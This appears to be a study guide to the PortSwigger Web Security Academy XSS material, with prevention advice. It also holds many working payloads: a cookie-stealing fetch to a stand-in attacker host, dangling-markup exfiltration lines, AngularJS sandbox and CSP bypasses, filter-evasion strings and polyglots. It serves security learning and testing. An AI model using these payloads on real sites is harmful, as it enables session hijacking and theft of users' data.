# PortSwigger Web Security Academy: Cross-Site Scripting (XSS) Reference Guide

This comprehensive reference note covers the entire Cross-Site Scripting (XSS) learning path from PortSwigger, synthesizing core attack vectors, advanced exploitation techniques, bypass strategies, and mitigation guidelines [146, 147, 148, 149]. Additionally, it integrates curated payloads and technical bypasses from the official PortSwigger XSS Cheat Sheet [1, 2].

---

## 1. Core XSS Concepts & Attack Types

Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application [146]. By injecting a malicious script, the attacker can execute arbitrary JavaScript in the victim's browser context, gaining full access to their session, cookies, and capabilities [146, 147, 148].

### Reflected XSS
Reflected XSS occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way [147].
*   **Attack Vector:** Typically delivered via a malicious URL or a phishing link [147].
*   **Example:** A search parameter reflected back directly to the page without sanitization or encoding:
    ```html
    <p>You searched for: <script>alert(1)</script></p>
    ```
*   **Impact:** Attacker-controlled scripts execute in the context of the victim's session, enabling credential harvesting, session hijacking, or unauthorized action execution [146, 147].

### Stored XSS (Persistent / Second-Order XSS)
Stored XSS arises when an application receives data from an untrusted source, stores it in a persistent database or storage medium, and later embeds that data within its HTTP responses in an unsafe way [148].
*   **Attack Vector:** Stored inside posts, comment fields, usernames, or message boards [148].
*   **Example:** A comment containing `<script>alert(1)</script>` is stored in the database and loaded by every user visiting the page [148].
*   **Impact:** Much higher impact because it is self-propagating and does not require social engineering links—any user who views the infected page becomes a victim automatically [148].

### DOM-Based XSS
DOM-based XSS (or Client-Side XSS) occurs when client-side JavaScript takes data from an attacker-controllable **source** and passes it to a dangerous **sink** that supports dynamic code execution or HTML rendering [148].
*   **Purely Client-Side:** The server-side code may not even be involved or vulnerable; the injection and execution happen entirely within the browser's DOM execution environment [148].
*   **Terminology:**
    *   **Source:** A JavaScript property that the attacker can control (e.g., `location.search`, `location.hash`, `document.referrer`, `window.name`) [148].
    *   **Sink:** A function or DOM object that processes and executes/renders the source data (e.g., `eval()`, `innerHTML`, `document.write()`, `setTimeout()`) [148].
*   **Testing for DOM XSS:** Tools like PortSwigger's **DOM Invader** can be used to track the flow of "canary" values from sources directly into dangerous sinks in real time [148].

---

## 2. Exploiting XSS: Real-World Scenarios

While `alert(1)` is a standard Proof of Concept (PoC) to verify execution, actual exploitation of XSS typically targets high-value administrative or user data [150].

### Session Cookie Theft (Exfiltration)
If the application does not protect session cookies with the `HttpOnly` flag, an attacker can use XSS to steal the session token and hijack the user's session [150].
*   **Classic Exfiltration Payload:**
    ```html
    <img src=x onerror="fetch('https://evil-attacker.net/log?cookie=' + document.cookie)">
    ```
*   **Parentheses/Quotes Avoidance Payload (Cheat Sheet):**
    ```html
    <video><source onerror=location=/.rs/+document.cookie></video>
    ```

### Password Harvesting (Credential Capturing)
XSS can be used to inject fake login forms or prompt browser autofill managers to auto-complete and reveal passwords [150].
*   **Mechanics:** Attackers inject a fake login overlay that looks identical to the target site. Once the victim types their username and password, the input is captured and exfiltrated [150].

### CSRF Protection Bypass
XSS can completely undermine Anti-CSRF protections [151].
*   Since the malicious script runs in the context of the user's browser session, it can perform a `GET` request to read the unique Anti-CSRF token from the page, extract it, and then execute high-privilege state-changing actions (such as changing the user's email or password) by issuing a forged `POST` request with the valid token attached [151].

---

## 3. Advanced Contexts: CSTI, Sandbox Escapes, & Dangling Markup

### Client-Side Template Injection (CSTI) & AngularJS Sandbox Escapes
When client-side frameworks like VueJS or AngularJS are used, they dynamically parse HTML templates [150]. If user input is reflected raw inside double curly braces `{{ ... }}`, it leads to template injection [150].

*   **AngularJS Sandbox:** AngularJS introduced a sandbox designed to prevent template expressions from accessing dangerous objects like `window`, `document`, or dangerous properties like `__proto__` [150].
*   **Escapes:** Researchers developed numerous payloads to access constructors and dynamically execute arbitrary JS [91, 150].
    *   *VueJS reflected (v2):*
        ```javascript
        {{constructor.constructor('alert(1)')()}}
        ```
    *   *AngularJS sandbox escapes (1.0.1 - 1.1.5 reflected):*
        ```javascript
        {{constructor.constructor('alert(1)')()}}
        ```
    *   *AngularJS (1.2.0 - 1.2.18 DOM-based escape):*
        ```javascript
        a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
        ```
    *   *AngularJS Sandbox bypasses on all versions (shorter using assignment):*
        ```html
        <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
        ```

### Dangling Markup Attacks
Dangling markup is a technique used to exfiltrate data from a page when classic XSS is blocked (e.g., due to strict Content Security Policies or WAFs filtering script tags) but HTML injection is still permitted [101, 151].
*   **Concept:** The attacker injects an unclosed HTML attribute (a "dangling" quote or tag), which "swallows" the remaining content of the page until a matching closing character is found [101]. This swallowed content (which may contain CSRF tokens, session IDs, or private data) is sent to the attacker's server [101].
*   **Examples:**
    *   *Background Image:*
        ```html
        <table background="//attacker-server.net/log?data=
        ```
    *   *Link Icon:*
        ```html
        <link rel=icon href="//attacker-server.net/log?
        ```
    *   *Using textareas to consume markup:*
        ```html
        <form><button formaction=//attacker-server.net/log>Exfiltrate</button><textarea name=x>
        ```

---

## 4. Content Security Policy (CSP) & Bypass Strategies

Content Security Policy (CSP) is a browser security mechanism designed to detect and mitigate XSS and related data exfiltration attacks by restricting the origins of scripts, stylesheets, and images [151].

### Mitigating XSS with CSP
*   CSP directives such as `script-src 'self'` or `script-src 'nonce-abc123hash'` restrict script execution to trusted domains or explicitly nonced inline scripts [151].
*   The `unsafe-inline` directive should be avoided to prevent classic inline payload execution [151].

### CSP Bypass via Policy Injection
If user-controllable input is reflected into the HTTP response header or a `<meta http-equiv="Content-Security-Policy" ...>` tag, the attacker can inject semicolons and add their own directives (such as adding their own malicious domain to `script-src`) to weaken or override the security policy [152].

### Bypassing CSP with AngularJS/CSTI
Since AngularJS parses the template directly in the client-side DOM, it evaluates expressions without triggering the standard inline script block checks of CSP [150]. Using the `ng-csp` directive or a sandbox escape allows execution within a strict CSP environment [101, 150].
*   *CSP Bypass Payload:*
    ```html
    <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>
    ```

---

## 5. Prevention & Mitigation Best Practices

Preventing XSS reliably requires combining defense-in-depth measures at both the application and network layers [152, 153].

1.  **Output Encoding (Context-Aware):**
    *   Ensure all user-controllable data is encoded before being written back to the page [153].
    *   Encoding must be **context-aware**. For example, encoding characters for an HTML body (converting `<` to `&lt;`) is fundamentally different from encoding within a JavaScript string context (using Unicode escapes like `\u0027` or hex escapes like `\x27`) [150].
2.  **Input Validation on Arrival:**
    *   Validate all incoming input against strict whitelists of expected patterns [154].
    *   Reject malformed input rather than attempting to filter or sanitize it manually [154].
3.  **Allowing Safe HTML (HTML Sanitization):**
    *   When an application must allow rich-text formatting (e.g., in a blog post editor), never use custom regex filters [131, 154].
    *   Use highly reputable, actively-maintained sanitization libraries such as **DOMPurify** [131] to strip out event handlers and dangerous tags like `<script>`, `<iframe>`, and `<object>` [154].
4.  **Security-Focused Template Engines:**
    *   Utilize modern frameworks like React, Angular, or backend templates (such as Twig or Jinja) that enforce automatic context-aware output encoding by default [154].

---

## 6. Curated PortSwigger XSS Cheat Sheet Payloads

The following is a highly structured, curated selection of high-value payloads from the official PortSwigger XSS Cheat Sheet, grouped by filtering scenarios and advanced bypass requirements [1, 2].

### A. Event Handlers (No User Interaction Required)
Perfect for automated exploitation when `<script>` tags are blocked by filters or Web Application Firewalls (WAFs) [2, 3].

| Event Handler | Target Tag | Payload |
|---|---|---|
| **onfocus** (autofocus) | Custom/Standard | `<xss onfocus=alert(1) autofocus tabindex=1>` [9] |
| **onanimationstart** | Custom/Standard | `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>` [4] |
| **ontoggle** | `details` | `<details ontoggle=alert(1) open>test</details>` [15] |
| **onerror** | `audio` / `img` | `<audio src/onerror=alert(1)>` [8] |
| **onbegin** | `svg` / `animate` | `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` [5] |

---

### B. Consuming (Swallowing) Tags
These tags are extremely powerful for swallowing subsequent code or breaking out of inline markup contexts [43]. They consume all text until their respective closing tag is encountered [43].

*   **`<noembed>` Consuming Payload:**
    ```html
    <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
    ```
*   **`<noscript>` Consuming Payload:**
    ```html
    <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
    ```
*   **`<textarea>` Consuming Payload:**
    ```html
    <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
    ```
*   **`<style>` Consuming Payload:**
    ```html
    <style><img title="</style><img src onerror=alert(1)>"></style>
    ```

---

### C. Restricted Characters: Bypassing "No Parentheses" `()` Filters
Often, filters block the use of parenthesis `()` to prevent function execution [45]. The following payloads utilize alternative JavaScript mechanics to execute arbitrary code [45, 47, 48].

*   **No Parentheses via Exception Handling (onerror):**
    ```html
    <script>onerror=alert;throw 1</script>
    ```
*   **No Parentheses via Exception & Eval on Chrome / Edge:**
    ```html
    <script>throw onerror=eval,'=alert\x281\x29'</script>
    ```
*   **No Parentheses via Exception & Eval on Safari:**
    ```html
    <script>throw onerror=eval,'alert\x281\x29'</script>
    ```
*   **No Parentheses via ES6 `hasInstance` with `eval`:**
    ```html
    <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
    ```
*   **No Parentheses via Template Strings (Backticks):**
    ```html
    <script>alert`1`</script>
    ```

---

### D. WAF Bypass & String Obfuscation (JavaScript Context)
When attempting to bypass static sign-offs or WAF signatures targeting strings like `'alert'`, these concatenation and escaping payloads allow clean evasion [107].

*   **Concatenation via `window` / Global Objects:**
    ```javascript
    ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
    ```
*   **Concatenation via `globalThis`:**
    ```javascript
    ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
    ```
*   **Comment Injection inside Properties:**
    ```javascript
    ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
    ```
*   **Hex Escape Sequences:**
    ```javascript
    ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6et']['\x64\x6fm\x61\x69\x6e']);//
    ```
*   **RegExp Source Property Concatenation:**
    ```javascript
    ';window[/al/.source+/ert/.source](/XSS/.source);//
    ```
*   **Unicode Escapes (ES6 Style):**
    ```html
    <script>\u{0000000061}lert(1)</script>
    ```

---

### E. Highly Potent Polyglots
Polyglots are payloads that remain valid and execute successfully across multiple distinct parsing contexts (such as HTML, attributes, single-quoted JS strings, double-quoted JS strings, template literals, and stylesheets) [106].

*   **Universal Polyglot 1:**
    ```javascript
    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
    ```
*   **Universal Polyglot 2:**
    ```javascript
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
    ```
*   **Universal Polyglot 3:**
    ```javascript
    javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
    ```

---

*Notes derived from official PortSwigger Web Security Academy documentation and cheat sheets [1, 146].*
